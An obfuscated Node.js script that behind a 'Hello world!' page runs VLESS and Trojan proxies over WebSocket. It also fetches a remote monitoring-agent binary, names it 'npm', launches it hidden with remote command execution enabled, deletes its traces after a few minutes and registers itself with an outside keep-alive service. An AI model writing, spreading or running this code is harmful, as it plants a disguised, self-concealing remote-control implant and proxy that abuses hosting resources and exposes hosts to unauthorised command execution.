function _0x58b3(){const _0x5d5953=['writeHead','crypto','from','SUB_PATH','map','161rqyGfQ','WSPATH','trim','npm\x20download\x20successfully','41994UTJokH','substr','every','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','update','443','type','NEZHA_KEY','length','\x20-p\x20','toString','UUID','replace','base64','aarch64','createServer','get','false','&path=%2F','url','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://amd64.ssss.nyc.mn/v1','join','772565lMDZfG','decode','data','Answer','slice','NEZHA_SERVER','writeFileSync','setsid\x20nohup\x20./npm\x20-s\x20','message','npm\x20is\x20already\x20running,\x20skip\x20running...','NEZHA_PORT','Unknown','text/plain','axios','8.8.4.4','289160IhAeKC','810982uGvGBw','connect','PORT','4zyyKrb','finish','8443','then','http','country_code','catch','npm','error','NAME','1.1.1.1','https://api.ip.sb/geoip','2096','vless://','Hello\x20world!','index.html','pipe','log','25001750GcyacY','readUInt8','unlink','pop',':443?security=tls&sni=','AUTO_ACCESS','end','arm64','path','utf8','digest','env','isp','https://arm64.ssss.nyc.mn/v1','41610411-b5af-4c36-aef2-1c64685c6d2c','Failed\x20to\x20resolve\x20','https://arm64.ssss.nyc.mn/agent','child_process','\x20with\x20all\x20DNS\x20servers','https://oooo.serv00.net/add-url','includes','createWriteStream','2087','concat','Not\x20Found\x0a','Server','write','readUInt16BE','find','true','2386536TGlLFF','arch','config.yaml','trojan://','close','createHash','https://dns.google/resolve?name=','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','&fp=chrome&type=ws&host=','chmod\x20+x\x20npm','reduce','post','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','stream','error:\x20','/bin/bash','buffer','Status','hex','3709329LNhOJB','Server\x20is\x20running\x20on\x20port\x20','text/html','198XvsbWU','2053','sub'];_0x58b3=function(){return _0x5d5953;};return _0x58b3();}const _0x187f64=_0x4cea;(function(_0x216451,_0x40866e){const _0x3a6c36=_0x4cea,_0x4cf347=_0x216451();while(!![]){try{const _0x250d3b=-parseInt(_0x3a6c36(0x12e))/0x1+-parseInt(_0x3a6c36(0xe5))/0x2+-parseInt(_0x3a6c36(0xf8))/0x3*(-parseInt(_0x3a6c36(0x131))/0x4)+-parseInt(_0x3a6c36(0x11e))/0x5+parseInt(_0x3a6c36(0x107))/0x6*(-parseInt(_0x3a6c36(0x103))/0x7)+-parseInt(_0x3a6c36(0x12d))/0x8*(parseInt(_0x3a6c36(0xfb))/0x9)+parseInt(_0x3a6c36(0x143))/0xa;if(_0x250d3b===_0x40866e)break;else _0x4cf347['push'](_0x4cf347['shift']());}catch(_0x5c02a1){_0x4cf347['push'](_0x4cf347['shift']());}}}(_0x58b3,0x97c78));const os=require('os'),http=require(_0x187f64(0x135)),fs=require('fs'),axios=require(_0x187f64(0x12b)),net=require('net'),path=require(_0x187f64(0xcf)),crypto=require(_0x187f64(0xff)),{Buffer}=require(_0x187f64(0xf5)),{exec,execSync}=require(_0x187f64(0xd8)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x187f64(0xd2)][_0x187f64(0x112)]||_0x187f64(0xd5),NEZHA_SERVER=process[_0x187f64(0xd2)][_0x187f64(0x123)]||'',NEZHA_PORT=process[_0x187f64(0xd2)][_0x187f64(0x128)]||'',NEZHA_KEY=process[_0x187f64(0xd2)][_0x187f64(0x10e)]||'',DOMAIN=process['env']['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process[_0x187f64(0xd2)][_0x187f64(0xcc)]||!![],WSPATH=process['env'][_0x187f64(0x104)]||UUID[_0x187f64(0x122)](0x0,0x8),SUB_PATH=process[_0x187f64(0xd2)][_0x187f64(0x101)]||_0x187f64(0xfd),NAME=process[_0x187f64(0xd2)][_0x187f64(0x13a)]||'',PORT=process['env'][_0x187f64(0x130)]||0x1eb4;function _0x4cea(_0x52551e,_0x39a1c7){_0x52551e=_0x52551e-0xcc;const _0x58b39b=_0x58b3();let _0x4cea34=_0x58b39b[_0x52551e];return _0x4cea34;}let ISP='';const GetISP=async()=>{const _0x1f0ed5=_0x187f64;try{const _0x615925=await axios['get'](_0x1f0ed5(0x13c)),_0x4a2748=_0x615925['data'];ISP=(_0x4a2748[_0x1f0ed5(0x136)]+'-'+_0x4a2748[_0x1f0ed5(0xd3)])['replace'](/ /g,'_');}catch(_0x42a47d){ISP=_0x1f0ed5(0x129);}};GetISP();const httpServer=http[_0x187f64(0x116)]((_0x442a7e,_0x440b2d)=>{const _0x4e18e8=_0x187f64;if(_0x442a7e[_0x4e18e8(0x11a)]==='/'){const _0x5c7fec=path[_0x4e18e8(0x11d)](__dirname,_0x4e18e8(0x140));fs['readFile'](_0x5c7fec,_0x4e18e8(0xd0),(_0x55e54f,_0x28c854)=>{const _0xe9e3f6=_0x4e18e8;if(_0x55e54f){_0x440b2d[_0xe9e3f6(0xfe)](0xc8,{'Content-Type':_0xe9e3f6(0xfa)}),_0x440b2d[_0xe9e3f6(0xcd)](_0xe9e3f6(0x13f));return;}_0x440b2d['writeHead'](0xc8,{'Content-Type':_0xe9e3f6(0xfa)}),_0x440b2d[_0xe9e3f6(0xcd)](_0x28c854);});return;}else{if(_0x442a7e['url']==='/'+SUB_PATH){const _0x33d148=NAME?NAME+'-'+ISP:ISP,_0x5e8644=_0x4e18e8(0x13e)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x4e18e8(0xed)+DOMAIN+_0x4e18e8(0x119)+WSPATH+'#'+_0x33d148,_0x3584aa=_0x4e18e8(0xe8)+UUID+'@'+DOMAIN+_0x4e18e8(0x147)+DOMAIN+_0x4e18e8(0xed)+DOMAIN+_0x4e18e8(0x119)+WSPATH+'#'+_0x33d148,_0x265c49=_0x5e8644+'\x0a'+_0x3584aa,_0x28f3a3=Buffer[_0x4e18e8(0x100)](_0x265c49)[_0x4e18e8(0x111)](_0x4e18e8(0x114));_0x440b2d[_0x4e18e8(0xfe)](0xc8,{'Content-Type':_0x4e18e8(0x12a)}),_0x440b2d[_0x4e18e8(0xcd)](_0x28f3a3+'\x0a');}else _0x440b2d[_0x4e18e8(0xfe)](0x194,{'Content-Type':_0x4e18e8(0x12a)}),_0x440b2d['end'](_0x4e18e8(0xdf));}}),wss=new WebSocket[(_0x187f64(0xe0))]({'server':httpServer}),uuid=UUID[_0x187f64(0x113)](/-/g,''),DNS_SERVERS=[_0x187f64(0x12c),_0x187f64(0x13b)];function resolveHost(_0x312528){return new Promise((_0x2360e8,_0x3ce4ff)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x312528)){_0x2360e8(_0x312528);return;}let _0x2c45cf=0x0;function _0x1999fb(){const _0x13317d=_0x4cea;if(_0x2c45cf>=DNS_SERVERS[_0x13317d(0x10f)]){_0x3ce4ff(new Error(_0x13317d(0xd6)+_0x312528+_0x13317d(0xd9)));return;}const _0x948d7d=DNS_SERVERS[_0x2c45cf];_0x2c45cf++;const _0x113c01=_0x13317d(0xeb)+encodeURIComponent(_0x312528)+'&type=A';axios[_0x13317d(0x117)](_0x113c01,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x13317d(0x134)](_0x5c03bf=>{const _0x54b7f8=_0x13317d,_0x5be751=_0x5c03bf[_0x54b7f8(0x120)];if(_0x5be751[_0x54b7f8(0xf6)]===0x0&&_0x5be751[_0x54b7f8(0x121)]&&_0x5be751['Answer']['length']>0x0){const _0x334dfa=_0x5be751['Answer'][_0x54b7f8(0xe3)](_0x139117=>_0x139117[_0x54b7f8(0x10d)]===0x1);if(_0x334dfa){_0x2360e8(_0x334dfa[_0x54b7f8(0x120)]);return;}}_0x1999fb();})[_0x13317d(0x137)](_0xdd0b8e=>{_0x1999fb();});}_0x1999fb();});}function handleVlessConnection(_0x349a86,_0x3f1d42){const _0x585485=_0x187f64,[_0x1a859f]=_0x3f1d42,_0x33fe0a=_0x3f1d42[_0x585485(0x122)](0x1,0x11);if(!_0x33fe0a[_0x585485(0x109)]((_0xd01264,_0x17e813)=>_0xd01264==parseInt(uuid[_0x585485(0x108)](_0x17e813*0x2,0x2),0x10)))return![];let _0x82e782=_0x3f1d42['slice'](0x11,0x12)[_0x585485(0x144)]()+0x13;const _0x5ed2c2=_0x3f1d42[_0x585485(0x122)](_0x82e782,_0x82e782+=0x2)[_0x585485(0xe2)](0x0),_0x5f3a0b=_0x3f1d42['slice'](_0x82e782,_0x82e782+=0x1)[_0x585485(0x144)](),_0x59bb96=_0x5f3a0b==0x1?_0x3f1d42[_0x585485(0x122)](_0x82e782,_0x82e782+=0x4)[_0x585485(0x11d)]('.'):_0x5f3a0b==0x2?new TextDecoder()[_0x585485(0x11f)](_0x3f1d42['slice'](_0x82e782+0x1,_0x82e782+=0x1+_0x3f1d42[_0x585485(0x122)](_0x82e782,_0x82e782+0x1)[_0x585485(0x144)]())):_0x5f3a0b==0x3?_0x3f1d42[_0x585485(0x122)](_0x82e782,_0x82e782+=0x10)[_0x585485(0xef)]((_0x4ffe5f,_0x23ba84,_0x279645,_0x339841)=>_0x279645%0x2?_0x4ffe5f[_0x585485(0xde)](_0x339841[_0x585485(0x122)](_0x279645-0x1,_0x279645+0x1)):_0x4ffe5f,[])[_0x585485(0x102)](_0x3d6b7d=>_0x3d6b7d[_0x585485(0xe2)](0x0)[_0x585485(0x111)](0x10))[_0x585485(0x11d)](':'):'';_0x349a86['send'](new Uint8Array([_0x1a859f,0x0]));const _0x16638e=createWebSocketStream(_0x349a86);return resolveHost(_0x59bb96)[_0x585485(0x134)](_0x153b9d=>{const _0x15724d=_0x585485;net['connect']({'host':_0x153b9d,'port':_0x5ed2c2},function(){const _0xd7b24d=_0x4cea;this[_0xd7b24d(0xe1)](_0x3f1d42[_0xd7b24d(0x122)](_0x82e782)),_0x16638e['on'](_0xd7b24d(0x139),()=>{})[_0xd7b24d(0x141)](this)['on'](_0xd7b24d(0x139),()=>{})[_0xd7b24d(0x141)](_0x16638e);})['on'](_0x15724d(0x139),()=>{});})['catch'](_0x2290bd=>{const _0x57e136=_0x585485;net[_0x57e136(0x12f)]({'host':_0x59bb96,'port':_0x5ed2c2},function(){const _0x89f603=_0x57e136;this[_0x89f603(0xe1)](_0x3f1d42[_0x89f603(0x122)](_0x82e782)),_0x16638e['on'](_0x89f603(0x139),()=>{})['pipe'](this)['on'](_0x89f603(0x139),()=>{})[_0x89f603(0x141)](_0x16638e);})['on'](_0x57e136(0x139),()=>{});}),!![];}function handleTrojanConnection(_0x498a08,_0x4d5af5){const _0x17cc2d=_0x187f64;try{if(_0x4d5af5['length']<0x3a)return![];const _0x36c344=_0x4d5af5[_0x17cc2d(0x122)](0x0,0x38)[_0x17cc2d(0x111)](),_0x53afcc=[UUID];let _0x3d7ac8=null;for(const _0x2eb2c7 of _0x53afcc){const _0x128dfe=crypto[_0x17cc2d(0xea)]('sha224')[_0x17cc2d(0x10b)](_0x2eb2c7)[_0x17cc2d(0xd1)](_0x17cc2d(0xf7));if(_0x128dfe===_0x36c344){_0x3d7ac8=_0x2eb2c7;break;}}if(!_0x3d7ac8)return![];let _0x2745ea=0x38;_0x4d5af5[_0x2745ea]===0xd&&_0x4d5af5[_0x2745ea+0x1]===0xa&&(_0x2745ea+=0x2);const _0x222c33=_0x4d5af5[_0x2745ea];if(_0x222c33!==0x1)return![];_0x2745ea+=0x1;const _0x33fa7c=_0x4d5af5[_0x2745ea];_0x2745ea+=0x1;let _0x1383fa,_0xfe6f2d;if(_0x33fa7c===0x1)_0x1383fa=_0x4d5af5[_0x17cc2d(0x122)](_0x2745ea,_0x2745ea+0x4)[_0x17cc2d(0x11d)]('.'),_0x2745ea+=0x4;else{if(_0x33fa7c===0x3){const _0x2385d1=_0x4d5af5[_0x2745ea];_0x2745ea+=0x1,_0x1383fa=_0x4d5af5[_0x17cc2d(0x122)](_0x2745ea,_0x2745ea+_0x2385d1)[_0x17cc2d(0x111)](),_0x2745ea+=_0x2385d1;}else{if(_0x33fa7c===0x4)_0x1383fa=_0x4d5af5[_0x17cc2d(0x122)](_0x2745ea,_0x2745ea+0x10)[_0x17cc2d(0xef)]((_0x265f60,_0x2c092e,_0x4d18d1,_0x41d17b)=>_0x4d18d1%0x2?_0x265f60['concat'](_0x41d17b[_0x17cc2d(0x122)](_0x4d18d1-0x1,_0x4d18d1+0x1)):_0x265f60,[])[_0x17cc2d(0x102)](_0x39d8d0=>_0x39d8d0[_0x17cc2d(0xe2)](0x0)[_0x17cc2d(0x111)](0x10))[_0x17cc2d(0x11d)](':'),_0x2745ea+=0x10;else return![];}}_0xfe6f2d=_0x4d5af5['readUInt16BE'](_0x2745ea),_0x2745ea+=0x2;_0x2745ea<_0x4d5af5[_0x17cc2d(0x10f)]&&_0x4d5af5[_0x2745ea]===0xd&&_0x4d5af5[_0x2745ea+0x1]===0xa&&(_0x2745ea+=0x2);const _0x594f37=createWebSocketStream(_0x498a08);return resolveHost(_0x1383fa)[_0x17cc2d(0x134)](_0xacd94=>{const _0x1ad1bd=_0x17cc2d;net[_0x1ad1bd(0x12f)]({'host':_0xacd94,'port':_0xfe6f2d},function(){const _0x1be15c=_0x1ad1bd;_0x2745ea<_0x4d5af5[_0x1be15c(0x10f)]&&this[_0x1be15c(0xe1)](_0x4d5af5[_0x1be15c(0x122)](_0x2745ea)),_0x594f37['on']('error',()=>{})[_0x1be15c(0x141)](this)['on'](_0x1be15c(0x139),()=>{})['pipe'](_0x594f37);})['on'](_0x1ad1bd(0x139),()=>{});})['catch'](_0x3ff7ef=>{const _0xe111e7=_0x17cc2d;net[_0xe111e7(0x12f)]({'host':_0x1383fa,'port':_0xfe6f2d},function(){const _0xa64838=_0xe111e7;_0x2745ea<_0x4d5af5[_0xa64838(0x10f)]&&this['write'](_0x4d5af5[_0xa64838(0x122)](_0x2745ea)),_0x594f37['on'](_0xa64838(0x139),()=>{})['pipe'](this)['on']('error',()=>{})[_0xa64838(0x141)](_0x594f37);})['on'](_0xe111e7(0x139),()=>{});}),!![];}catch(_0x4125eb){return![];}}wss['on']('connection',(_0x51db3a,_0x10a072)=>{const _0x28cc4e=_0x187f64,_0x1c6a70=_0x10a072[_0x28cc4e(0x11a)]||'';_0x51db3a['once'](_0x28cc4e(0x126),_0x346afe=>{const _0x3c227c=_0x28cc4e;if(_0x346afe[_0x3c227c(0x10f)]>0x11&&_0x346afe[0x0]===0x0){const _0x47f86e=_0x346afe['slice'](0x1,0x11),_0x8fed4e=_0x47f86e[_0x3c227c(0x109)]((_0x17fea6,_0x1b8ff7)=>_0x17fea6==parseInt(uuid[_0x3c227c(0x108)](_0x1b8ff7*0x2,0x2),0x10));if(_0x8fed4e){!handleVlessConnection(_0x51db3a,_0x346afe)&&_0x51db3a['close']();return;}}!handleTrojanConnection(_0x51db3a,_0x346afe)&&_0x51db3a[_0x3c227c(0xe9)]();})['on'](_0x28cc4e(0x139),()=>{});});const getDownloadUrl=()=>{const _0x51fcd6=_0x187f64,_0x4bc1a9=os[_0x51fcd6(0xe6)]();return _0x4bc1a9==='arm'||_0x4bc1a9===_0x51fcd6(0xce)||_0x4bc1a9===_0x51fcd6(0x115)?!NEZHA_PORT?_0x51fcd6(0xd4):_0x51fcd6(0xd7):!NEZHA_PORT?_0x51fcd6(0x11c):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x22c8e2=_0x187f64;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1cb126=getDownloadUrl(),_0x238715=await axios({'method':_0x22c8e2(0x117),'url':_0x1cb126,'responseType':_0x22c8e2(0xf2)}),_0x313fbf=fs[_0x22c8e2(0xdc)]('npm');return _0x238715[_0x22c8e2(0x120)][_0x22c8e2(0x141)](_0x313fbf),new Promise((_0x19e607,_0x4a60a3)=>{const _0xa62e1e=_0x22c8e2;_0x313fbf['on'](_0xa62e1e(0x132),()=>{const _0x6ee48f=_0xa62e1e;console[_0x6ee48f(0x142)](_0x6ee48f(0x106)),exec(_0x6ee48f(0xee),_0x7e687=>{if(_0x7e687)_0x4a60a3(_0x7e687);_0x19e607();});}),_0x313fbf['on']('error',_0x4a60a3);});}catch(_0x3f7657){throw _0x3f7657;}},runnz=async()=>{const _0x5aab57=_0x187f64;try{const _0x242e6e=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x242e6e[_0x5aab57(0x105)]()!==''){console[_0x5aab57(0x142)](_0x5aab57(0x127));return;}}catch(_0xe369e){}await downloadFile();let _0x1a5e48='',_0x315823=[_0x5aab57(0x10c),_0x5aab57(0x133),_0x5aab57(0x13d),_0x5aab57(0xdd),'2083',_0x5aab57(0xfc)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3b9ddd=_0x315823[_0x5aab57(0xdb)](NEZHA_PORT)?'--tls':'';_0x1a5e48=_0x5aab57(0x125)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5aab57(0x110)+NEZHA_KEY+'\x20'+_0x3b9ddd+_0x5aab57(0xf1);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x572754=NEZHA_SERVER[_0x5aab57(0xdb)](':')?NEZHA_SERVER['split'](':')[_0x5aab57(0x146)]():'',_0x335a82=_0x315823['includes'](_0x572754)?_0x5aab57(0xe4):_0x5aab57(0x118),_0x322652='client_secret:\x20'+NEZHA_KEY+_0x5aab57(0x10a)+NEZHA_SERVER+_0x5aab57(0x11b)+_0x335a82+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x5aab57(0x124)](_0x5aab57(0xe7),_0x322652);}_0x1a5e48=_0x5aab57(0xec);}else{console[_0x5aab57(0x142)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x1a5e48,{'shell':_0x5aab57(0xf4)},_0x377465=>{const _0x16cd92=_0x5aab57;if(_0x377465)console[_0x16cd92(0x139)]('npm\x20running\x20error:',_0x377465);else console[_0x16cd92(0x142)]('npm\x20is\x20running');});}catch(_0x20821d){console['error'](_0x5aab57(0xf3)+_0x20821d);}};async function addAccessTask(){const _0x276a31=_0x187f64;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x59be3e='https://'+DOMAIN;try{const _0x142a0a=await axios[_0x276a31(0xf0)](_0x276a31(0xda),{'url':_0x59be3e},{'headers':{'Content-Type':'application/json'}});console[_0x276a31(0x142)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x26d45f){}}const delFiles=()=>{const _0x3a4001=_0x187f64;fs[_0x3a4001(0x145)](_0x3a4001(0x138),()=>{}),fs[_0x3a4001(0x145)](_0x3a4001(0xe7),()=>{});};httpServer['listen'](PORT,()=>{const _0x1d0c27=_0x187f64;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1d0c27(0x142)](_0x1d0c27(0xf9)+PORT);});
